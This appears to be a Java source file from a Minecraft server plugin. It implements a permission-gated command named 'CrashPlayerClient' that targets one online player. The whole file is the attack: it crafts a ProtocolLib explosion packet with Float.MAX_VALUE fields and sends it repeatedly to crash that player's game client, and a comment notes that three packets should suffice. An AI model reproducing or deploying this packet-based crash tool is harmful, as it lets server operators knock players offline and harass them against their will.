package cn.ChengZhiYa.MHDFTools.commands;

import cn.ChengZhiYa.MHDFTools.map.StringHasMap;
import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.events.PacketContainer;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import static cn.ChengZhiYa.MHDFTools.utils.Util.i18n;

public final class CrashPlayerClient implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, @NotNull Command command, @NotNull String label, String[] args) {
        if (sender.hasPermission("MHDFTools.Command.Crash")) {
            if (args.length == 1) {
                String PlayerName = args[0];
                if (Bukkit.getPlayer(PlayerName) == null) {
                    sender.sendMessage(i18n("PlayerNotOnline"));
                    return false;
                }

                if (StringHasMap.getHasMap().get(PlayerName + "_Crash") != null) {
                    sender.sendMessage(i18n("Crash.RepeatExecution"));
                    return false;
                }
                Player player = Bukkit.getPlayer(PlayerName);
                sender.sendMessage(i18n("Crash.Execution"));
                StringHasMap.getHasMap().put(Objects.requireNonNull(player).getName() + "_Crash", "崩端ing");

                PacketContainer packetContainer = new PacketContainer(PacketType.Play.Server.EXPLOSION);
                packetContainer.getModifier().writeDefaults();
                packetContainer.getFloat().write(0, (float) player.getLocation().getX());
                packetContainer.getFloat().write(1, (float) player.getLocation().getY());
                packetContainer.getFloat().write(2, (float) player.getLocation().getZ());
                packetContainer.getSpecificModifier(List.class).write(0, new ArrayList(0));
                packetContainer.getFloat().write(0, Float.MAX_VALUE);
                packetContainer.getFloat().write(1, Float.MAX_VALUE);
                packetContainer.getFloat().write(2, Float.MAX_VALUE);
                packetContainer.getFloat().write(3, Float.MAX_VALUE);
                // 发送包数量，理应3个就能Crash
                for (int i = 0; i < 5; i++) {
                    ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer, true);
                    if (!player.isOnline()) {
                        break;
                    }
                }
                StringHasMap.getHasMap().put(Objects.requireNonNull(player).getName() + "_Crash", null);
            } else {
                sender.sendMessage(i18n("Usage.Crash", label));
            }
        } else {
            sender.sendMessage(i18n("NoPermission"));
        }
        return false;
    }
}
